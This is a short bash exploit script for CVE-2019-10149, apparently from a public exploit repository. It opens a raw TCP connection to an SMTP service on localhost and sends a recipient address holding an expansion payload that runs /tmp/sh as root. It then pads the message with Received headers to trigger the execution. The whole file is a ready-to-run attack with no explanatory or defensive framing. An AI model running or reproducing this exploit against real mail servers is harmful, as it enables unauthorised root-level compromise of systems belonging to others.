#!/usr/bin/env bash
# CVE-2019-10149 exploit by dhn
# https://github.com/dhn/exploits/CVE-2019-10149

# Execute /tmp/sh with root permission
export PAYLOAD="\${run{\\\x2Fbin\\\x2Fsh\\\t-c\\\t\\\x22exec\\\x20\\\x2ftmp\\\x2fsh\\\x22}}@localhost"
export HOST="localhost"
export PORT="25"

trigger() { 
	exec 3<>/dev/tcp/${HOST}/${PORT}
	read -u 3 RESPONSE 
	printf "${RESPONSE}" >/dev/null 2>&1
	printf "HELO $(hostname -f)\n">&3
	read -u 3 RESPONSE
	printf "MAIL FROM:<>\n">&3
	read -u 3 RESPONSE
	printf "RCPT TO:<${PAYLOAD}>\n">&3
	read -u 3 RESPONSE 
	printf "DATA\n">&3
	read -u 3 RESPONSE 
	printf "$(for DATA in {1..31}; do printf 'Received: %s' ${DATA}\\n; done)\n.\n">&3
	read -u 3 RESPONSE 
	printf "QUIT\r\n">&3
	read -u 3 RESPONSE 
}

main() {
	printf "[+] CVE-2019-10149 exploit by dhn\n"
	printf "[+] Send mail...\n"
	trigger
	sleep 1 
	printf "[+] Execute /tmp/sh!\n"
	printf "[+] Done\n"
}; main
